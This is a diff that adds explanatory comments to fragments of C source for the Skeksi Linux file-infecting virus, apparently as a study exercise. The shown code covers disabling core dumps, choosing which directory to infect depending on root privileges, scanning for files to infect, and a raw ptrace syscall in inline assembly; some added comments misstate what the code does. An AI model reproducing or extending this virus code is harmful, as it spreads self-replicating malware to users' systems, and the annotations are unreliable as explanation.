@@ -13,6 +13,7 @@
  *
  */
 
+//PER: __asm__ volatile means executing the assembly instructions as it is
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -738,21 +739,25 @@ void do_main(struct bootstrap_data *bootstrap)
                 _printf("!! Skeksi Virus, 2015 !!\n");
                 Exit(-1);
         }
-        _prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
+        _prctl(PR_SET_DUMPABLE, 0, 0, 0, 0); //PER: while the process is running its core can be dumped
 #endif
 
 rescan:
-	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
-	if (!_strcmp(dir, "."))
-		scan_count = 1;
+	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs); // PER: choosing a directory based on user id to attack
+
+	if (!_strcmp(dir, ".")) //PER: if it's a current directory
+		scan_count = 1; // PER: if non-root user
 	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
 	
 	dd = _open(dir, O_RDONLY | O_DIRECTORY, 0);
+
+	// PER: if open fails
 	if (dd < 0) {
 		DEBUG_PRINT("open failed\n");
 		return;
 	}
 	
+
 	load_self(&self);
 	
 	for (;;) {
@@ -800,7 +805,7 @@ infect:
 		goto rescan;
 	}
 
-	rnum = get_random_number(50);
+	rnum = get_random_number(50); // PER: outputs a 0<= random_number <=50 
 	if (rnum == LUCKY_NUMBER) 
 		display_skeksi();
 	
@@ -985,11 +990,12 @@ long _ptrace(long request, long pid, void *addr, void *data)
 
         __asm__ volatile(
                         "mov %0, %%rdi\n"
-                        "mov %1, %%rsi\n"
+						"mov %1, %%rsi\n"
                         "mov %2, %%rdx\n"
                         "mov %3, %%r10\n"
                         "mov $101, %%rax\n"
-                        "syscall" : : "g"(request), "g"(pid), "g"(addr), "g"(data));
+                        "syscall" : : "g"(request), "g"(pid), "g"(addr), "g"(data)
+		);
         asm("mov %%rax, %0" : "=r"(ret));
         
         return ret;
